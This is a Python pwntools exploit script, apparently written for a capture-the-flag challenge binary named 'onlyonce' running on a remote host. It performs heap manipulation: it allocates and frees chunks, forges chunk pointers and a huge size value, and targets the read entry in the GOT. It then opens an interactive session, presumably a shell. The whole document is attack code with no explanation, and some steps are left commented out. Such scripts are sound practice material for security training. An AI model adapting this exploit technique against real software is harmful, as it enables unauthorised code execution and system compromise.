#!/usr/bin/env python
from pwn import *



context.arch = 'amd64'

e , l = ELF('./onlyonce') , ELF('./libc-2.23.so')


host , port  = '10.0.26.6' , 31842
y = remote( host , port )
#y = process( 'onlyonce' , env = {'LD_PRELOAD' : './libc-2.23.so'} )
#y = process( './onlyonce' )

def add( data ):
    y.sendlineafter( '>>' , '1' )
    y.sendlineafter( '>>' , data )

def sho():
    y.sendlineafter( '>>' , '2' )

def dle( idx ):
    y.sendlineafter( '>>' , '3' )
    y.sendlineafter( '>>' , str( idx ) )

def onc( idx , data ):
    y.sendlineafter( '>>' , '4' )
    y.sendlineafter( '>>' , str( idx ) )
    y.sendafter( '>>' , data )


raw_input('...')


y.sendafter( '...' , p64( 0x0 ) + p64( 0x21 )[:-1] )

add( '0' * 0x18 )
add( '1' * 0x18 )
add( '2' * 0x18 )
add( '3' * 0x18 )
add( '4' * 0x18 )
add( '5' * 0x08 )
add( '6' * 0x18 )
add( '7' * 0x08 )

dle( 5 )
dle( 7 )

add( p64( 0x6020c0 ) )
add( 'b' * 0x08 )
add( 'c' * 0x08 )
#add( p64( 0xfffffffffffffff0 ) + 'a' * 8 + p64( 0x6020a0 + 6 )[:-1] )
add( p64( 0xfffffffffffffff0 ) + 'a' * 8 + p64( e.got['read'] + 2 )[:-2] )

#onc( 0 , '\x47\x31' )


y.interactive()